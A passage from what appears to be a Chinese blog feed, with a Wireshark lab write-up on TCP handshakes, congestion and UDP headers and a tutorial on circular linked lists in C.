src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/566278-20220412123840685.png" alt="预览大图"></p><ol><li><p><code>第一次握手</code>：客户端将标志位 SYN 置为 1 ，随机产生一个值<code>SEQ = X</code>，并将该数据包发送给服务器，客户机进入 SYN_SENT 状态，等待服务器确认；</p></li><li><p><code>第二次握手</code>：服务器收到数据包后由标志位<code>SYN = 1</code>，知道客户端请求建立连接，服务器将标志位 SYN 和 ACK 都置为 1 ，<code>ACK = X + 1</code>，随机产生一个值<code>SEQ = Y</code>，并将该数据包发送给客户端以确认连接请求，服务器进入 SYN_RCVD 状态；</p></li><li><p><code>第三次握手</code>：客户端收到确认后，检查 ACK 是否为<code>X + 1</code>，ACK 是否为 1 ，如果正确则将标志位 ACK 置为 1 ，<code>ACK = Y + 1</code>，并将该数据包发送给服务器，服务器检查 ACK 是否为<code>K + 1</code>，ACK 是否为 1 ，如果正确则连接建立成功，客户端和服务器进入 ESTABLISHED 状态。</p></li></ol><blockquote><p>握手过程中传送的包里不包含数据，三次握手完毕后，客户端与服务器才正式开始传送数据。理想状态下，TCP 连接一旦建立，在通信双方中的任何一方主动关闭连接之前，TCP 连接都将被一直保持下去。</p></blockquote><p><strong>四次握手断开连接</strong></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/566687.png" alt="预览大图"></p><ol><li><code>第一次握手</code>：主动关闭方发送一个 FIN ，用来关闭主动方到被动关闭方的数据传送，也就是主动关闭方告诉被动关闭方：我已经不会再给你发数据了(当然，在 FIN 包之前发送出去的数据，如果没有收到对应的 ACK 确认报文，主动关闭方依然会重发这些数据)，但此时主动关闭方还可以接受数据。</li><li><code>第二次握手</code>：被动关闭方收到 FIN 包后，发送一个 ACK 给对方，确认序号为收到序号 + 1 (与 SYN 相同，一个 FIN 占用一个序号)。</li><li><code>第三次握手</code>：被动关闭方发送一个 FIN ，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动关闭方，我的数据也发送完了，不会再给你发数据了。</li><li><code>第四次握手</code>：主动关闭方收到 FIN 后，发送一个 ACK 给被动关闭方，确认序号为收到序号 + 1 ，至此，完成四次挥手。</li></ol><h3 id="0x0202-实验流程"><a href="#0x0202-实验流程" class="headerlink" title="0x0202 实验流程"></a>0x0202 实验流程</h3><p><strong>（1）打开文件夹中<code>tcp-ethereal-trace-1</code>文件；</strong></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412125057849.png" alt="image-20220412125057849"></p><p><strong>（2）打开编辑 ( edit ) -&gt;首选项 ( preferences )-&gt; Protocols -&gt; TCP ，取消勾选 Relative sequence numbers（相对序列号）;</strong></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412125245451.png" alt="image-20220412125245451"></p><p><strong>（3）第一次握手时， TCP SYN 区段的序列号（ SEQ ）是什么，填写到 txt 文件中；</strong></p><p>如下图所示: </p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412132736548.png" alt="image-20220412132736548"></p><p>第一次握手TCP SYN 区段的序列号（ SEQ ）&#x3D; <strong>232129012</strong> .</p><p><strong>（4）由三次握手协议，客户端首次回复中，<code>ACK=SEQ+1</code>，根据（3）中的 SEQ 号，用<code>tcp.ack==SEQ+1</code>（具体数字）命令筛选出相应数据报，查看<code>gaia.cs.umass.edu</code> 发送给客户端计算机回复的 SYN 的序列号（ SEQ ）是多少，填写到 txt 文件中；</strong></p><p>由上一步可知<code>seq = 232129012</code>,</p><p>则<code>seq + 1 = 232129013</code>, 在过滤器中输入 tcp.ack &#x3D;&#x3D; 232129013 即可筛选出<code>gaia.cs.umass.edu</code> 发送给客户端计算机回复的TCP包, 如下所示: </p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412133155228.png" alt="image-20220412133155228"></p><p>可以得到回复的 SYN 的序列号（ SEQ ） &#x3D; <strong>883061785</strong>.</p><h3 id="0x0203-最终结果"><a href="#0x0203-最终结果" class="headerlink" title="0x0203 最终结果"></a>0x0203 最终结果</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一次握手，TCP SYN区段的序列号是：232129012</span><br><span class="line">gaia.cs.umass.edu发送给客户端加算计以回复的SYN的序列号是：883061785</span><br></pre></td></tr></table></figure><h2 id="0x03-拥塞控制"><a href="#0x03-拥塞控制" class="headerlink" title="0x03 拥塞控制"></a>0x03 拥塞控制</h2><h3 id="0x0301-相关知识"><a href="#0x0301-相关知识" class="headerlink" title="0x0301 相关知识"></a>0x0301 相关知识</h3><p>为了完成本关任务，你需要掌握：  </p><ol><li>了解拥塞控制；</li><li>在 Wireshark 中抓取 TCP 数据包。</li></ol><p><strong>什么是拥塞</strong></p><p>拥塞现象是指到达通信子网中某一部分的分组数量过多，使得该部分网络来不及处理，以致引起这部分乃至整个网络性能下降的现象，严重时甚至会导致网络通信业务陷入停顿，即出现死锁现象。这种现象跟公路网中经常所见的交通拥挤一样，当节假日公路网中车辆大量增加时，各种走向的车流相互干扰，使每辆车到达目的地的时间都相对增加（即延迟增加），甚至有时在某段公路上车辆因堵塞而无法开动（即发生局部死锁）。</p><p><strong>造成拥塞的原因</strong></p><ol><li>多条流入线路有分组到达，并需要同一输出线路，此时，如果路由器没有足够的内存来存放所有这些分组，那么有的分组就会丢失；</li><li>路由器的慢带处理器的缘故，以至于难以完成必要的处理工作，如缓冲区排队、更新路由表等。</li></ol><p><strong>防止拥塞的方法</strong></p><ol><li>在传输层可采用重传策略、乱序缓存策略、确认策略、流控制策略和确定超时策略；</li><li>在网络层可采用子网内部的虚电路与数据报策略、分组排队和服务策略、分组丢弃策略、路由算法和分组生存管理；</li><li>在数据链路层可采用重传策略、乱序缓存策略、确认策略和流控制策略。</li></ol><h3 id="0x0302-实验流程"><a href="#0x0302-实验流程" class="headerlink" title="0x0302 实验流程"></a>0x0302 实验流程</h3><p><strong>（1）打开 Wireshark，加载实训文件夹中的tcp-ethereal-trace-1文件；</strong></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412125057849.png" alt="image-20220412125057849"></p><p><strong>（2）使用命令ip.dst&#x3D;&#x3D;128.119.245.12进行筛选；</strong></p><p>如下图所示:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412135132694.png" alt="image-20220412135132694"></p><p><strong>（3）选中一条数据报，点击统计（ Statistic s）-&gt; TCP 流图形-&gt;时间序列（ Stevens ），观察图形。判断此文件中是否有重传的区段（序列号一直增大则无，反之则有），填写到 txt 文件中；</strong></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412135306721.png" alt="image-20220412135306721"></p><p>图像为一直增大,所以没有发生重传.</p><p><strong>（4）使用 http 命令筛选数据报，查看数据传输大小以及使用时间，计算 TCP 链接的吞吐量（kb&#x2F;s、结果保留整数），填写到 txt 文件中。</strong></p><blockquote><p>注：吞吐量&#x3D;数据传输大小&#x2F;所用时间。</p></blockquote><p>首先输入<code>http</code>筛选HTTP报文, 如下所示:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412135454021.png" alt="image-20220412135454021"></p><p>点开第一个http报文(第二个为响应报文, 这里用不上), 查看数据部分的<code>数据传输大小</code>(<strong>Reassembled TCP length</strong>), 如下所示:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412135801992.png" alt="image-20220412135801992"></p><p>第二步就是查看<code>所用时间</code>, 在TCP段中找到<code>[Timestamps]</code>,如下所示:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412140245270.png" alt="image-20220412140245270"></p><p>综上所述, 得到:</p><ul><li>数据传输大小 &#x3D;$164090(bits)$</li><li>所用时间 &#x3D; $5.297341000(seconds)$</li><li>$\therefore$ 吞吐量 &#x3D; $\cfrac{164090}{5.2973410\cdot1024}&#x3D;30.24991984≈30$ (保留整数)</li></ul><h3 id="0x0303-最终结果"><a href="#0x0303-最终结果" class="headerlink" title="0x0303 最终结果"></a>0x0303 最终结果</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文件中是否有重传的区段（填写&quot;是/否&quot;）：否</span><br><span class="line">TCP链接的吞吐量：30</span><br></pre></td></tr></table></figure><h2 id="0x04-UDP-包分析"><a href="#0x04-UDP-包分析" class="headerlink" title="0x04 UDP 包分析"></a>0x04 UDP 包分析</h2><h3 id="0x0401-相关知识"><a href="#0x0401-相关知识" class="headerlink" title="0x0401 相关知识"></a>0x0401 相关知识</h3><p>为了更好掌握本章内容，你需要了解的有：  </p><ol><li>UDP 报文的简介；</li><li>UDP 报文格式；</li><li>Wireshark 软件中的 UDP 抓包分析。</li></ol><p><strong>UDP 简介</strong></p><p>UDP（User Datagram Protocol），用户数据报协议，是 OSI（Open System Interconnection，开放式系统互联） 参考模型中一种无连接的传输层协议，提供面向事务的简单不可靠信息传送服务。<br>UDP 协议与 TCP 协议一样用于处理数据包，在 OSI 模型中，两者都位于传输层，处于 IP 协议的上一层。UDP 有不提供数据包分组、组装和不能对数据包进行排序的缺点，也就是说，当报文发送之后，是无法得知其是否安全完整到达的。</p><p>许多应用只支持 UDP ，它不产生任何额外的数据，即使知道有破坏的包也不进行重发。当强调传输性能而不是传输的完整性时，如音频和多媒体应用，UDP 是最好的选择。数据传输时间很短，以至于此前的连接过程成为整个流量主体的情况下，UDP 也是一个好的选择。</p><p><strong>UDP 报文格式</strong></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/583435.png" alt="预览大图"></p><p>UDP 首部有 8 个字节，由 4 个字段构成，每个字段都是两个字节： </p><ul><li><p><code>源端口</code>： 源端口号，需要对方回信时选用，不需要时全部置 0 ；</p></li><li><p><code>目的端口</code>：目的端口号，在终点交付报文的时候需要用到；</p></li></ul><blockquote><p>注：端口是用来指明数据的来源（应用程序）以及数据发往的目的地（同样是应用程序）。</p><p>字段包含了 16 比特的 UDP 协议端口号，它使得多个应用程序可以多路复用同一个传输层协议及 UDP 协议，<br>仅通过端口号来区分不同的应用程序。</p></blockquote><ul><li><code>长度</code>：UDP 的数据报的长度（包括首部和数据）其最小值为 8（只有首部）。字段记录了该 UDP 数据包的总长度（以字节为单位），包括 8 字节的 UDP 头和其后的数据部分。最小值是 8（报文头的长度），最大值为 65535 字节；</li><li><code>校验和</code>：检测 UDP 数据报在传输中是否有错，有错则丢弃。它的值是通过计算 UDP 数据报及一个伪包头而得到的。校验和的计算方法与通用的一样，都是累加求和。</li></ul><p><strong>UDP 校验和的计算</strong></p><blockquote><p><strong>原理</strong>:<br>对发送方的 UDP 报文段的所有 16 比特字的和进行反码运算，当求和遇见溢出的时候，进行回卷（回卷的补充在下面），得到的结果放在 UDP 报文段中的校验和字段。</p></blockquote><p>UDP 校验的所需信息:<br>  （1）UDP 伪首部：<code>源 IP + 目的 IP + Byte 0 + Byte17 + UDP 长度</code>，目的是让 UDP 两次检查数据是否以及正确到达目的地，只是单纯为了做校验用；<br>  （2）UDP 首部：该长度不是报文的总长度，而是 UDP（包括 UDP 头和数据部分）的总长度；<br>  （3）UDP 的数据部分。</p><p>计算步骤:<br>（1）把伪首部添加到 <code>UDP</code> 上；<br>（2）计算初始时将校验和字段添零；<br>（3）把所有位划分为 <code>16 位</code>（ 2 字节）的字；<br>（4）把所有 16 位的字相加，如果遇到进位，则将高于 16 字节的进位部分的值加到最低位上；<br>（5）将所有字相加得到的结果应该为一个 16 位的数，将该数按位取反则可以得到<code>校验和</code>。</p><p>在计算校验和的时候，需要在 UDP 数据报之前增加 12 字节的伪首部，伪首部并不是 UDP 真正的首部。只是在计算校验和，临时添加在 UDP 数据报的前面，得到一个临时的 UDP 数据报。校验和就是按照这个临时的 UDP 数据报计算的。<br>伪首部既不向下传送也不向上递交，而仅仅是为了计算校验和。<br>这样的校验和，既检查了<code> UDP 数据报</code>，又对 IP 数据报的<code>源 IP 地址</code>和<code>目的 IP 地址</code>进行了检验。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/581700.png" alt="预览大图"></p><p><strong>UDP 与 TCP 对比</strong></p><p>UDP 和 TCP 协议的主要区别是两者在如何实现信息的可靠传递方面不同。TCP 协议中包含了专门的传递保证机制，当数据接收方收到发送方传来的信息时，会自动向发送方发出确认消息。发送方只有在接收到该确认消息之后才继续传送其它信息，否则将一直等待直到收到确认信息为止。与 TCP 不同，UDP 协议并不提供数据传送的保证机制。如果在从发送方到接收方的传递过程中出现数据包的丢失，协议本身并不能做出任何检测或提示。因此，通常人们把 UDP 协议称为不可靠的传输协议。</p><ol><li><code>TCP</code>是面向连接的传输控制协议，而<code>UDP</code>提供了无连接的数据报服务，<code>TCP</code>具有高可靠性，确保传输数据的正确性，不出现丢失或乱序；</li><li><code>UDP</code>在传输数据前不建立连接，不对数据报进行检查与修改，无须等待对方的应答，所以会出现分组丢失、重复、乱序，应用程序需要负责传输可靠性方面的所有工作；</li><li><code>UDP</code>具有较好的实时性，工作效率较<code>TCP</code>协议高；</li><li><code>UDP</code>段结构比<code>TCP</code>的段结构简单，因此网络开销也小；</li><li><code>TCP</code>协议可以保证接收端毫无差错地接收到发送端发出的字节流，为应用程序提供可靠的通信服务。对可靠性要求高的通信系统往往使用<code>TCP</code>传输数据。</li></ol><h3 id="0x0402-实验流程"><a href="#0x0402-实验流程" class="headerlink" title="0x0402 实验流程"></a>0x0402 实验流程</h3><p><strong>（1）打开 Wireshark，加载实训文件夹中的<code>http-ethereal-trace-5</code>文件，筛选 UDP 数据包；</strong></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412142104777.png" alt="image-20220412142104777"></p><p><strong>（2）从跟踪中选择一个 UDP 数据包。打开该数据包，查看 UDP 标头中的四个字段的名称，并将这四个字段的名称写入 txt 文件（用“;”分隔）；</strong></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412142141282.png" alt="image-20220412142141282"></p><p>如图所示, UDP(User Datagram Protocal)标头的四个字段分别为:</p><ul><li>Source Port <code>源端口</code></li><li>Destination Port <code>目的端口</code></li><li>Length <code>长度</code></li><li>Checksum <code>校验和</code></li></ul><p><strong>（3）UDP 标头的四个字段总共有多少字节，将信息写入 txt 文件；</strong></p><p>根据UDP报文格式:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/583435-20220412142343712.png" alt="预览大图"></p><p>可以得到上述UDP标头四个字段总共有 2+2+2+2 &#x3D; 8 个字节.</p><p><strong>（4）从 IPV4（Internet Protocol Version4）中找到 UDP 的协议号是多少，将信息写入 txt 文件；</strong></p><p>如图所示:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412142504747.png" alt="image-20220412142504747"></p><p> UDP 的协议号为: <strong>17</strong></p><h3 id="0x0403-最终结果"><a href="#0x0403-最终结果" class="headerlink" title="0x0403 最终结果"></a>0x0403 最终结果</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">四个字段名称（首字母大写）：Source Port;Destination Port;Length;Checksum</span><br><span class="line">四个字段总共有多少字节：8</span><br><span class="line">IPV4中找到UDP的协议号是：17</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 网络协议分析 </tag>
            
            <tag> 传输层 </tag>
            
            <tag> TCP </tag>
            
            <tag> UDP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[数据结构]循环链表</title>
      <link href="/2022/04/12/5d38b39c2237-q1jun/"/>
      <url>/2022/04/12/5d38b39c2237-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="循环链表-Circular-LinkList"><a href="#循环链表-Circular-LinkList" class="headerlink" title="循环链表(Circular LinkList)"></a>循环链表(Circular LinkList)</h1><p>循环链表有以下两种:</p><ul><li>循环单链表: 从一个结点出发只能找到后续的各个结点.</li><li>循环双链表: 从一个结点出发可以找到其他任何一个结点.</li></ul><h2 id="0x01-循环单链表"><a href="#0x01-循环单链表" class="headerlink" title="0x01 循环单链表"></a>0x01 循环单链表</h2><blockquote><p>单链表和循环单链表的区别:</p><ul><li>单链表: 表尾结点的next指针指向NULL</li><li>循环单链表: 表尾结点的next指针指向头结点</li></ul></blockquote><p>循环单链表的定义和单链表一样, 如下所示:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span><span class="comment">//定义单链表结点类型</span></span><br><span class="line">  ElemType data;<span class="comment">//每个节点存放一个数据元素</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span> <span class="comment">//指针指向下一个节点</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> <span class="title">LNode</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">LinkList</span>;</span></span><br></pre></td></tr></table></figure><p>或者,</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span> <span class="comment">//定义单链表结点类型</span></span><br><span class="line">  ElemType data;<span class="comment">//每个节点存放一个数据元素</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span> <span class="comment">//指针指向下一个节点</span></span><br><span class="line">&#125;LNode, *LinkList;</span><br></pre></td></tr></table></figure><p>两者等价。</p><h3 id="0x0101-循环单链表的初始化"><a href="#0x0101-循环单链表的初始化" class="headerlink" title="0x0101 循环单链表的初始化"></a>0x0101 循环单链表的初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 初始化一个循环单链表</span></span><br><span class="line"><span class="comment"> * @param &#123;LinkList&amp;&#125; L</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitList</span><span class="params">(LinkList&amp; L)</span> &#123;</span><br><span class="line">    L = (LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode)); <span class="comment">//分配一个头结点</span></span><br><span class="line">    <span class="keyword">if</span> (L == <span class="literal">NULL</span>) <span class="comment">//内存不足分配失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    L-&gt;next = L; <span class="comment">//头结点next指向头结点</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化: 头结点的next指针指向自己.</p><h3 id="0x0102-循环单链表的判空"><a href="#0x0102-循环单链表的判空" class="headerlink" title="0x0102 循环单链表的判空"></a>0x0102 循环单链表的判空</h3><p>所以判断一个循环单链表是否为空值时只需要判断是否 <code>L-&gt;next == L</code>即可(头结点的next指针指向自己).</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 判断一个循环单链表是否为空</span></span><br><span class="line"><span class="comment"> * @param &#123;LinkList&#125; L</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isEmpty</span><span class="params">(LinkList L)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (L-&gt;next == L)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x0103-循环单链表的判尾"><a href="#0x0103-循环单链表的判尾" class="headerlink" title="0x0103 循环单链表的判尾"></a>0x0103 循环单链表的判尾</h3><p>同理, 判断一个结点是否为循环单链表的表尾结点只需要判断:</p><ul><li>该结点的next指针是否指向头结点</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 判断结点p是否为循环单链表的表尾结点</span></span><br><span class="line"><span class="comment"> * @param &#123;LinkList&#125; L</span></span><br><span class="line"><span class="comment"> * @param &#123;LNode*&#125; p</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isTail</span><span class="params">(LinkList L, LNode* p)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;next == L)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>循环单链表的插入和删除操作和单链表类似, 由于篇幅不宜过长, 就不展开叙述了.</p><h2 id="0x02-循环双链表"><a href="#0x02-循环双链表" class="headerlink" title="0x02 循环双链表"></a>0x02 循环双链表</h2><blockquote><p>双链表和循环双链表的区别:</p><ul><li>双链表:<ul><li>表头结点的prior指向NULL</li><li>表尾结点的next指向NULL</li></ul></li><li>循环双链表:<ul><li>表头结点的prior指向表尾结点</li><li>表尾结点的next指向表头结点</li></ul></li></ul></blockquote><p>循环双链表的定义和双链表一样, 如下所示: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> &#123;</span> <span class="comment">//定义双链表结点类型</span></span><br><span class="line">    <span class="type">int</span> data; <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span>* <span class="title">prior</span>, * <span class="title">next</span>;</span> <span class="comment">//前驱指针和后继指针</span></span><br><span class="line">&#125;DNode, * DLinklist;</span><br></pre></td></tr></table></figure><p>或者:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> &#123;</span> <span class="comment">//定义双链表结点类型</span></span><br><span class="line">    <span class="type">int</span> data; <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span>* <span class="title">prior</span>, * <span class="title">next</span>;</span> <span class="comment">//前驱指针和后继指针</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> <span class="title">Dnode</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> * <span class="title">DLinklist</span>;</span></span><br></pre></td></tr></table></figure><p>两者等价.</p><h3 id="0x0201-循环双链表的初始化"><a href="#0x0201-循环双链表的初始化" class="headerlink" title="0x0201 循环双链表的初始化"></a>0x0201 循环双链表的初始化</h3><p>初始化一个循环双链表: 头结点的<code>prior指针</code>指向头结点, 且头结点的<code>next指针</code>也指向头结点.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @description: 初始化空的循环双链表</span></span><br><span class="line"><span class="comment"> * @param &#123;DLinklist&amp;&#125; L</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitDLinkList</span><span class="params">(DLinklist&amp; L)</span> &#123;</span><br><span class="line">    L = (DNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DNode)); <span class="comment">//分配一个头结点</span></span><br><span class="line">    <span class="keyword">if</span> (L == <span class="literal">NULL</span>) <span class="comment">//内存不足,分配失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    L-&gt;prior = L; <span class="comment">//头结点的prior指向头结点</span></span><br><span class="line">    L-&gt;next = L; <span class="comment">//头结点的next指向头结点</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x0202-循环双链表的判空"><a href="#0x0202-循环双链表的判空" class="headerlink" title="0x0202 循环双链表的判空"></a>0x0202 循环双链表的判空</h3><p>判断一个循环双链表是否为空:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @description: 判断循环双链表是否为空</span></span><br><span class="line"><span class="comment"> * @param &#123;DLinklist&#125; L</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isEmpty</span><span class="params">(DLinklist L)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (L-&gt;next == L)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x0203-循环双链表的判尾"><a href="#0x0203-循环双链表的判尾" class="headerlink" title="0x0203 循环双链表的判尾"></a>0x0203 循环双链表的判尾</h3><p>判断一个结点是否为循环双链表的表尾结点:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @description: 判断结点p是否为循环双链表的表尾结点</span></span><br><span class="line"><span class="comment"> * @param &#123;DLinklist&#125; L</span></span><br><span class="line"><span class="comment"> * @param &#123;DNode*&#125; p</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isTail</span><span class="params">(DLinklist L, DNode* p)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;next == L)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>谢谢观看 😘</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EduCoder NAT协议分析</title>
      <link href="/2022/04/12/3cf278610c9a-q1jun/"/>
      <url>/2022/04/12/3cf278610c9a-q1jun/</url>
      
